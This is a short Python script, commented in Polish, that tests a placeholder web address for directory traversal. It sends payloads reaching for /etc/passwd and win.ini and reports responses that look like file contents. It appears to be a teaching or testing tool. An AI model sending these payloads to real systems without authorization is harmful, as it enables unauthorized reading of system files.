# SKRYP SPRAWDZAJĄCY APLIKACJĘ WEBOWĄ POD KĄTEM PODATNOŚCI NA ATAKI DIRECTORY TRAVERSAL

# import biblioteki request - do wysyłania zapytań HTTP
import requests

# wybieramy adres strony, którą sprawdzimy (podstawiamy tylko bazę URL bez wartości parametru file)
url_base = "adres_strony"

# payloady które potem wyślemy na stronę
payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "..\\..\\windows\\win.ini"]

# pętla do przechodzenia przez payloady
for payload in payloads:
    # dodanie payloadu do url (poprawiona składnia)
    test_url = url_base + payload
    # pobieramy odpowiedź
    response = requests.get(test_url)
    # wypisanie odpowiedzi 
    print(f"Test: {payload} => Status: {response.status_code}")
    # sprawdzenie czy atak jest możliwy
    if "root:" in response.text or "[extensions]" in response.text:
        print(f"Możliwy Directory Traversal: {payload}")
